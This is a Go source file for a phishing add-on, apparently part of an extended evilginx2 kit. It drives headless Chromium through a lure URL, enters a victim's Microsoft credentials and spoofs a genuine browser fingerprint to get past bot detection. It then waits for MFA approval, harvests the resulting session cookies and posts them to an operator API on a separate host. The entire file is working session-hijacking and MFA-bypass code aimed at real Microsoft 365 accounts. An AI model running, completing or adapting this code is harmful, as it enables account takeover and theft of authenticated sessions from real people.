// puppet/main.go — evilpuppet-lite: headless-Chromium sidecar (Pro-feature #5).
// Logs into the target through the evilginx2-extended proxy using a REAL
// browser (valid telemetry: Chromium TLS fingerprint, HTTP/2 settings, client
// hints), waits for the operator/victim to complete MFA on their phone, then
// pushes the resulting session cookies to the operator API so the session is
// marked verified and the cookies are attached server-side.
//
// Supported login pages:
//   - Microsoft (loginfmt/passwd + MFA push or authenticator approval):
//     waits until __Host-MSAAUTH cookie appears (post-auth MSA session token).
//   - Lab pages (input[name=username]/password/button submit) — unchanged.
//
// Usage:
//   evilpuppet-lite -url <lure-url> -user U -pass P -phishlet ms365 \
//     -api-host 127.0.0.1:9443 [-cfgdir ~/.evilginx/api] [-chrome /path] \
//     [-mfa-wait 300]
package main

import (
	"bytes"
	"context"
	"crypto/tls"
	"encoding/json"
	"flag"
	"fmt"
	"io"
	stdlog "log"
	"net/http"
	"os"
	"path/filepath"
	"regexp"
	"strings"
	"time"

	"github.com/chromedp/cdproto/network"
	"github.com/chromedp/chromedp"
)

type ppCookie struct {
	Name     string `json:"name"`
	Value    string `json:"value"`
	Path     string `json:"path"`
	Domain   string `json:"domain"`
	HttpOnly bool   `json:"http_only"`
}

type ppPayload struct {
	SessionToken string     `json:"session_token"`
	Phishlet     string     `json:"phishlet"`
	Cookies      []ppCookie `json:"cookies"`
}

var sessionCookieRe = regexp.MustCompile(`^[0-9a-z]{4}-[0-9a-z]{4}$`)

func die(format string, a ...interface{}) {
	fmt.Printf("[puppet] FATAL: "+format+"\n", a...)
	os.Exit(1)
}

// trySendKeys — đợi selector visible (tối đa 45s) rồi gõ giá trị.
func trySendKeys(sel string, val string) chromedp.Action {
	return chromedp.ActionFunc(func(ctx context.Context) error {
		var last error = fmt.Errorf("selector not found: %s", sel)
		for i := 0; i < 45; i++ {
			err := chromedp.SendKeys(sel, val, chromedp.ByQuery, chromedp.NodeVisible).Do(ctx)
			if err == nil {
				fmt.Println("[puppet] typed:", sel)
				return nil
			}
			last = err
			time.Sleep(1 * time.Second)
		}
		return last
	})
}

// tryClick — đợi selector visible (tối đa 30s) rồi click.
func tryClick(sel string) chromedp.Action {
	return chromedp.ActionFunc(func(ctx context.Context) error {
		var last error = fmt.Errorf("selector not found: %s", sel)
		for i := 0; i < 30; i++ {
			err := chromedp.Click(sel, chromedp.ByQuery, chromedp.NodeVisible).Do(ctx)
			if err == nil {
				fmt.Println("[puppet] clicked:", sel)
				return nil
			}
			last = err
			time.Sleep(1 * time.Second)
		}
		return last
	})
}

func main() {
	urlFlag := flag.String("url", "", "lure/login URL (through the evilginx2 proxy)")
	user := flag.String("user", "", "username")
	pass := flag.String("pass", "", "password")
	passfile := flag.String("passfile", "", "file containing the password (overrides -pass)")
	phishlet := flag.String("phishlet", "", "phishlet name (for the API payload)")
	apiHost := flag.String("api-host", "", "API host:port, e.g. 192.168.80.68:9443")
	cfgdir := flag.String("cfgdir", "", "API cert dir (server's ~/.evilginx/api)")
	chrome := flag.String("chrome", "", "chromium binary path (default: autodetect)")
	ua := flag.String("ua", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36", "user-agent (khớp browser thật để qua botguard)")
	to := flag.Int("timeout", 180, "overall seconds")
	mfaWait := flag.Int("mfa-wait", 300, "seconds to wait for MFA approval (authenticator push)")
	hostRules := flag.String("host-rules", "", "chromium host-resolver-rules, e.g. MAP www.labphish.test 192.168.80.68")
	flag.Parse()
	if *passfile != "" {
		b, err := os.ReadFile(*passfile)
		if err != nil {
			die("passfile: %v", err)
		}
		*pass = strings.TrimSpace(string(b))
	}
	if *urlFlag == "" || *apiHost == "" || *cfgdir == "" {
		flag.Usage()
		os.Exit(1)
	}

	allocOpts := append(chromedp.DefaultExecAllocatorOptions[:],
		chromedp.Flag("headless", "new"),
		chromedp.Flag("no-sandbox", true),
		chromedp.Flag("disable-gpu", true),
		chromedp.Flag("disable-dev-shm-usage", true),
		chromedp.Flag("ignore-certificate-errors", true),
	)
	if *chrome != "" {
		allocOpts = append(allocOpts, chromedp.ExecPath(*chrome))
	}
	if *ua != "" {
		allocOpts = append(allocOpts, chromedp.UserAgent(*ua))
	}
	if *hostRules != "" {
		allocOpts = append(allocOpts, chromedp.Flag("host-resolver-rules", *hostRules))
	}
	// use the system resolver (getaddrinfo -> /etc/hosts) instead of the
	// built-in async DNS client, which can bypass /etc/hosts entries
	allocOpts = append(allocOpts, chromedp.Flag("disable-async-dns", true))

	ctxOpts := []chromedp.ContextOption{}
	if os.Getenv("PUPPET_DEBUG") != "" {
		ctxOpts = append(ctxOpts, chromedp.WithErrorf(stdlog.New(os.Stderr, "[cdp-err] ", 0).Printf))
	}
	allocCtx, acancel := chromedp.NewExecAllocator(context.Background(), allocOpts...)
	defer acancel()
	ctx, ccancel := chromedp.NewContext(allocCtx, ctxOpts...)
	defer ccancel()
	ctx, ccancel2 := context.WithTimeout(ctx, time.Duration(*to+*mfaWait)*time.Second)
	defer ccancel2()

	fmt.Println("[puppet] launching headless chromium...")
	var cookiesJSON []byte

	// MSA (login.live.com / login.microsoft.com) flow helpers
	emailSel := `input[name="loginfmt"]`
	passSel := `input[name="passwd"]`
	nextSel := `input[type=submit]`

	var authCookieSeen bool
	_ = authCookieSeen
	waitAuthCookie := chromedp.ActionFunc(func(ctx context.Context) error {
		fmt.Println("[puppet] waiting for MFA approval (max", *mfaWait, "s) — approve on your phone...")
		deadline := time.Now().Add(time.Duration(*mfaWait) * time.Second)
		for time.Now().Before(deadline) {
			c, err := network.GetCookies().Do(ctx)
			if err == nil {
				for _, ck := range c {
					if ck.Name == "__Host-MSAAUTH" && len(ck.Value) > 16 {
						authCookieSeen = true
						fmt.Println("[puppet] __Host-MSAAUTH present — session established")
						return nil
					}
				}
			}
			time.Sleep(3 * time.Second)
		}
		return fmt.Errorf("timeout waiting for __Host-MSAAUTH")
	})

	err := chromedp.Run(ctx,
		chromedp.Navigate(*urlFlag),
		trySendKeys(emailSel, *user),
		tryClick(nextSel),
		// sau email có thể xen trang passkey promotion — nút Skip/back dẫn về passwd
		trySendKeys(passSel, *pass),
		tryClick(nextSel),
		// đợi MFA: user duyệt authenticator trên điện thoại; token xuất hiện = xong
		waitAuthCookie,
		chromedp.ActionFunc(func(ctx context.Context) error {
			c, err := network.GetCookies().Do(ctx)
			if err != nil {
				return err
			}
			type wire struct {
				Name     string `json:"name"`
				Value    string `json:"value"`
				Path     string `json:"path"`
				Domain   string `json:"domain"`
				HttpOnly bool   `json:"http_only"`
			}
			list := make([]wire, 0, len(c))
			for _, ck := range c {
				list = append(list, wire{ck.Name, ck.Value, ck.Path, ck.Domain, ck.HTTPOnly})
			}
			cookiesJSON, err = json.Marshal(list)
			return err
		}),
	)
	if err != nil {
		die("chromedp: %v", err)
	}
	fmt.Println("[puppet] login flow completed, cookies read")

	// extract evilginx session token from the tracking cookie
	var payload ppPayload
	payload.Phishlet = *phishlet
	var cookies []ppCookie
	if err := json.Unmarshal(cookiesJSON, &cookies); err != nil {
		die("cookies: %v", err)
	}
	for _, ck := range cookies {
		if sessionCookieRe.MatchString(ck.Name) && payload.SessionToken == "" {
			payload.SessionToken = ck.Value
		}
		cookies = append(cookies, ck)
	}
	payload.Cookies = cookies
	if payload.SessionToken == "" {
		die("no evilginx session cookie found (%d cookies)", len(cookies))
	}
	fmt.Printf("[puppet] session token: %s...\n", payload.SessionToken[:12])

	// push to the operator API over mTLS
	cert, err := tls.LoadX509KeyPair(filepath.Join(*cfgdir, "client.crt"), filepath.Join(*cfgdir, "client.key"))
	if err != nil {
		die("cert: %v", err)
	}
	tlsCfg := &tls.Config{Certificates: []tls.Certificate{cert}, InsecureSkipVerify: true}
	client := &http.Client{
		Timeout:   15 * time.Second,
		Transport: &http.Transport{TLSClientConfig: tlsCfg},
	}
	meta, err := os.ReadFile(filepath.Join(*cfgdir, "config.json"))
	if err != nil {
		die("api meta: %v", err)
	}
	var m struct {
		BasePath string `json:"base_path"`
	}
	if err := json.Unmarshal(meta, &m); err != nil || m.BasePath == "" {
		die("api meta: bad config.json")
	}
	body, _ := json.Marshal(payload)
	resp, err := client.Post("https://"+*apiHost+m.BasePath+"/pp/cookies", "application/json", bytes.NewReader(body))
	if err != nil {
		die("api post: %v", err)
	}
	defer resp.Body.Close()
	rb, _ := io.ReadAll(resp.Body)
	fmt.Printf("[puppet] api status=%d body=%s\n", resp.StatusCode, string(rb))
	if resp.StatusCode != 200 {
		os.Exit(1)
	}
	fmt.Println("[puppet] DONE — cookies imported into session")
}
